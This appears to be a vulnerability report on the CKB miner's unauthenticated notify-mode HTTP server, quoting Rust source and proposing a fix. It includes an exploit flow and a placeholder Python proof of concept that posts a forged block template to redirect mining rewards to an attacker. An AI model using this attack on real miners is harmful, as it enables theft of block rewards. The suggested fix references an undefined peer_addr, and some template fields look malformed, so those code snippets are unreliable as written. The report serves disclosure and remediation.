### Title
Unauthenticated Block Template Injection via Miner Notify HTTP Server — (`miner/src/client.rs`)

---

### Summary

When the CKB miner is configured in "notify mode" (`listen` address set), it starts an HTTP server that accepts block template updates from **any source without authentication**. Any attacker who can reach the miner's TCP listen port can POST a crafted `BlockTemplate` JSON payload, causing the miner to immediately redirect all its hashpower to mine the attacker-controlled template — which can carry an attacker-chosen coinbase lock script, stealing block rewards.

---

### Finding Description

**Root cause:** The `handle` function in `miner/src/client.rs` is the HTTP request handler for the miner's notify-mode server. It accepts any incoming HTTP request, deserializes the body as a `BlockTemplate`, and unconditionally calls `client.update_block_template(template)` — with zero authentication, zero IP allowlist check, and zero source verification. [1](#0-0) 

```rust
async fn handle(
    client: Client,
    req: Request<hyper::body::Incoming>,
) -> Result<Response<Empty<Bytes>>, Error> {
    let body = BodyExt::collect(req).await?.aggregate();

    if let Ok(template) = serde_json::from_reader(body.reader()) {
        client.update_block_template(template);   // ← no auth, no source check
    }

    Ok(Response::new(Empty::new()))
}
```

`update_block_template` then updates `current_work_id` and sends the injected `Work` to all mining worker threads via `new_work_tx`: [2](#0-1) 

The `work_id` guard inside `update_block_template` only rejects a template whose `work_id` equals the *current* one. An attacker simply supplies any different `work_id` (a value they fully control in the crafted JSON) to pass this check unconditionally.

The notify-mode server is started in `listen_block_template_notify`, which binds to the configured `SocketAddr` and serves every accepted TCP connection through the unauthenticated `handle` function: [3](#0-2) 

Critically, `parse_authorization` exists in the same file and is used for **outgoing** requests from the miner to the CKB node RPC — but is never applied to **incoming** requests on the notify server: [4](#0-3) 

The `listen` field is typed as `Option<SocketAddr>` in `MinerClientConfig`: [5](#0-4) 

The default template comments it out as `127.0.0.1:8888`, but operators running distributed mining setups routinely bind it to `0.0.0.0` or a LAN address to receive notifications from the CKB node running on a separate host.

**Exploit flow:**

1. Attacker identifies a miner running in notify mode (port scan or knowledge of the operator's setup).
2. Attacker crafts a `BlockTemplate` JSON with:
   - A `work_id` different from the current one (e.g., `0xdeadbeef`).
   - A `cellbase` transaction whose output lock script pays to the attacker's address.
   - Plausible `compact_target`, `current_time`, `number`, etc. copied from a recent legitimate template.
3. Attacker POSTs the payload to `http://<miner-listen-addr>/`.
4. `handle` deserializes it and calls `update_block_template`; the `work_id` guard passes because the injected ID differs from the current one.
5. `Works::New(work)` is sent to all worker threads via `new_work_tx`.
6. Workers immediately switch to mining the attacker's template.
7. If a valid nonce is found, `submit_nonce` in `miner.rs` assembles and submits the block — with the attacker's coinbase — to the CKB node. [6](#0-5) 

---

### Impact Explanation

- **Direct theft of block rewards:** A successfully mined block using the injected template pays the coinbase reward (currently 1,917.8 CKB per block on mainnet) to the attacker's lock script, not the legitimate miner's.
- **Hashpower waste:** Even if the injected template is ultimately rejected by the network (e.g., due to an invalid parent hash), the miner wastes all hashpower on it until the next legitimate poll cycle, causing revenue loss proportional to the poll interval.
- **Persistent attack:** The attacker can continuously re-inject templates faster than the legitimate CKB node sends notifications, keeping the miner permanently redirected.

---

### Likelihood Explanation

- Notify mode is a documented, production-supported feature explicitly described in `ckb-miner.toml` and in the startup log message.
- Operators running the CKB node and miner on separate machines **must** bind the listen address to a non-loopback interface, making the port network-reachable.
- No credentials, keys, or privileged access are required — a single unauthenticated HTTP POST suffices.
- The `BlockTemplate` JSON schema is fully public (documented in the CKB RPC README), so crafting a valid payload requires no reverse engineering.

---

### Recommendation

Add source-IP allowlisting or a shared-secret token check inside `handle` before calling `update_block_template`. The simplest correct fix is to verify the request originates from the configured CKB node's address, or to require a configurable bearer token in the `Authorization` header — mirroring the `parse_authorization` pattern already used for outgoing RPC calls. Example:

```rust
async fn handle(
    client: Client,
    req: Request<hyper::body::Incoming>,
    allowed_origin: std::net::IpAddr,   // passed from config
) -> Result<Response<Empty<Bytes>>, Error> {
    // reject requests not from the trusted CKB node
    if peer_addr.ip() != allowed_origin {
        return Ok(Response::builder().status(403).body(Empty::new()).unwrap());
    }
    let body = BodyExt::collect(req).await?.aggregate();
    if let Ok(template) = serde_json::from_reader(body.reader()) {
        client.update_block_template(template);
    }
    Ok(Response::new(Empty::new()))
}
```

---

### Proof of Concept

**Preconditions:** Miner is running in notify mode with `listen = "0.0.0.0:8888"` (or any reachable address). Attacker knows the listen address.

```python
import requests, json

# Attacker's CKB lock script (secp256k1, attacker's pubkey hash)
attacker_lock = {
    "code_hash": "0x9bd7e06f3ecf4be0f2fcd2188b23f1b9fcc88e5d4b65a8637b17723bbda3cce8",
    "hash_type": "type",
    "args": "0xATTACKER_PUBKEY_HASH_20_BYTES"
}

# Craft a minimal BlockTemplate with attacker coinbase
# (copy real fields from a recent get_block_template response,
#  replace cellbase output lock with attacker_lock, change work_id)
fake_template = {
    "version": "0x0",
    "compact_target": "0x1a08a97e",   # copied from real tip
    "current_time": "0x18f1a2b3c4d",
    "number": "0x500",
    "epoch": "0x708_0001_0000",
    "parent_hash": "0x<real_tip_hash>",
    "cycles_limit": "0xa625900",
    "bytes_limit": "0x91c08",
    "uncles_count_limit": "0x2",
    "uncles": [],
    "transactions": [],
    "proposals": [],
    "cellbase": {
        "work_id": "0xdeadbeef",   # different from current → passes guard
        "data": {
            # cellbase tx with output paying to attacker_lock
            # (serialized as CKB JSON transaction)
        }
    },
    "work_id": "0xdeadbeef",
    "dao": "0x<valid_dao_field>",
    "extension": None
}

# Single unauthenticated POST — no credentials needed
r = requests.post("http://<miner-ip>:8888/", json=fake_template)
print(r.status_code)   # 200 — template accepted, miner now mines for attacker
```

After this POST, the miner's workers immediately switch to the injected template. The next valid nonce found results in a block submitted with the attacker's coinbase, paying the full block reward to the attacker.

### Citations

**File:** miner/src/client.rs (L234-271)
```rust
    async fn listen_block_template_notify(&self, addr: SocketAddr) {
        let listener = TcpListener::bind(addr).await.unwrap();
        let server = auto::Builder::new(TokioExecutor::new());
        let graceful = GracefulShutdown::new();
        let stop_rx: CancellationToken = new_tokio_exit_rx();

        loop {
            let client = self.clone();
            let handle = service_fn(move |req| handle(client.clone(), req));
            tokio::select! {
                conn = listener.accept() => {
                    let (stream, _) = match conn {
                        Ok(conn) => conn,
                        Err(e) => {
                            info!("accept error: {}", e);
                            tokio::time::sleep(std::time::Duration::from_secs(1)).await;
                            continue;
                        }
                    };
                    let stream = hyper_util::rt::TokioIo::new(Box::pin(stream));
                    let conn = server.serve_connection_with_upgrades(stream, handle);

                    let conn = graceful.watch(conn.into_owned());
                    tokio::spawn(async move {
                        if let Err(err) = conn.await {
                            info!("connection error: {}", err);
                        }
                    });
                },
                _ = stop_rx.cancelled() => {
                    info!("Miner client received exit signal. Exit now");
                    break;
                }
            }
        }
        drop(listener);
        graceful.shutdown().await;
    }
```

**File:** miner/src/client.rs (L293-312)
```rust
    fn update_block_template(&self, block_template: BlockTemplate) {
        let work_id = block_template.work_id.into();
        let updated = |id| {
            if id != work_id || id == 0 {
                Some(work_id)
            } else {
                None
            }
        };
        if self
            .current_work_id
            .fetch_update(Ordering::SeqCst, Ordering::SeqCst, updated)
            .is_ok()
        {
            let work: Work = block_template.into();
            if let Err(e) = self.new_work_tx.send(Works::New(work)) {
                error!("notify_new_block error: {:?}", e);
            }
        }
    }
```

**File:** miner/src/client.rs (L358-369)
```rust
async fn handle(
    client: Client,
    req: Request<hyper::body::Incoming>,
) -> Result<Response<Empty<Bytes>>, Error> {
    let body = BodyExt::collect(req).await?.aggregate();

    if let Ok(template) = serde_json::from_reader(body.reader()) {
        client.update_block_template(template);
    }

    Ok(Response::new(Empty::new()))
}
```

**File:** miner/src/client.rs (L380-394)
```rust
fn parse_authorization(url: &Uri) -> Option<HeaderValue> {
    let a: Vec<&str> = url.authority()?.as_str().split('@').collect();
    if a.len() >= 2 {
        if a[0].is_empty() {
            return None;
        }
        let mut encoded = "Basic ".to_string();
        base64::prelude::BASE64_STANDARD.encode_string(a[0], &mut encoded);
        let mut header = HeaderValue::from_str(&encoded).unwrap();
        header.set_sensitive(true);
        Some(header)
    } else {
        None
    }
}
```

**File:** util/app-config/src/configs/miner.rs (L28-30)
```rust
    /// listen block_template notify instead of loop poll
    pub listen: Option<SocketAddr>,
}
```

**File:** miner/src/miner.rs (L140-188)
```rust
    fn submit_nonce(&mut self, pow_hash: Byte32, work: Work, nonce: u128) {
        self.notify_workers(WorkerMessage::Stop);
        let raw_header = work.block.header().raw();
        let header = Header::new_builder().raw(raw_header).nonce(nonce).build();
        let block = work
            .block
            .as_advanced_builder()
            .header(header.into_view())
            .build();
        let block_hash = block.hash();
        let parent_hash = block.parent_hash();

        if self.legacy_work.contains(&parent_hash) {
            debug!(
                "uncle {} pow_hash: {:#x}, header: {}",
                block.number(),
                pow_hash,
                block.header()
            );
            self.notify_workers(WorkerMessage::Start);
            return;
        } else {
            debug!(
                "block {} pow_hash: {:#x}, header: {}",
                block.number(),
                pow_hash,
                block.header()
            );
        }

        self.legacy_work.put(parent_hash, ());
        if self.stderr_is_tty {
            debug!("Found! #{} {:#x}", block.number(), block_hash);
        } else {
            info!("Found! #{} {:#x}", block.number(), block_hash);
        }

        // submit block and poll new work
        {
            if let Err(e) = self
                .client
                .submit_block(&work.work_id.to_string(), block.data())
            {
                self.legacy_work.pop(&block.parent_hash());
                error!("rpc call submit_block error: {:?}", e);
            }
            self.client.blocking_fetch_block_template();
            self.notify_workers(WorkerMessage::Start);
        }
```
